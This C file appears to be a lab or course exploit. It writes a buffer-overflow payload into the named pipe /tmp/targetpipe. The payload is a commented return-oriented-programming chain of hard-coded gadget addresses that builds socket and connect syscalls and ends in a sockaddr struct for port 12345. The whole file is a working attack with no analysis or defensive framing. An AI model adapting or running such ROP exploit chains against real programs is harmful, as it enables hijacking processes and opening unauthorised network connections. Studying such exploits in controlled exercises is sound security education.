#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09" // no-ops until buffer overflow
                      "\xbe\xc6\xb6\xbb" // move 85 into eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x9e\xb1\xb6\xbb" // add 12 to eax; eax now 394
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\x22\xA4\xBA\xBB\xf0\x28\xbf\xbf" // pop esp into ecx (future address of 0 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (0 word) to stack
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x22\xA4\xBA\xBB\xec\x28\xbf\xbf" // pop esp into ecx (future address of 1 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x22\xA4\xBA\xBB\xe8\x28\xbf\xbf" // pop esp into ecx (future address of 2 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
                      "\xE5\xB6\xA9\xBB" // trap into kernel
                      "\x68\x8b\xaa\xbb" // move esp + 12 bytes to next gadget
                      "\xaa\xaa\xaa\xaa" // four-byte value 2
                      "\xaa\xaa\xaa\xaa" // four-byte value 1
                      "\xaa\xaa\xaa\xaa" // four-byte value 0 
                      "" // addy 0xbfbf28f4
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x8a\xb8\xb7\xbb" // inc edx now value 3
                      "\x22\xA4\xBA\xBB\x7c\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                      "\x8a\xb8\xb7\xbb" // inc edx now value 4
                      "\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb\x8a\xb8\xb7\xbb" // edx now 16
                      "\x22\xA4\xBA\xBB\x84\x29\xbf\xbf" // pop the addy esp stores into ecx (future address of 16 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (16 word) to stack
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\xe1\xa0\xb9\xbb\x8c\x29\xbf\xbf" // pop addy off of stack into eax
                      "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
                      "\x8C\x9C\xA9\xBB" // inc eax
                      "\x4d\xb9\xb5\xbb" // mov dl (0 byte) to addy stored at [eax + 1]
                      "\xbe\xc6\xb6\xbb" // move 85 into eax
                      "\x9e\xb1\xb6\xbb" // add 12 to eax
                      "\x8C\x9C\xA9\xBB" // inc eax (now 98)
                      "\xE5\xB6\xA9\xBB" // trap into kernel
                      "\x01\x01\x01\x01" // dummy value
                      "\xaa\xaa\xaa\xaa" // four-byte value 3
                      "\x88\x29\xbf\xbf" // addy of x struct
                      "\xaa\xaa\xaa\xaa" // four-byte value 16
                      ""
                      "\xaa"
                      "\x02"
                      "\x39\x30"
                      "\x01\xAA\xAA\x7f"
                      "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
                      );
  
  return 0;
}
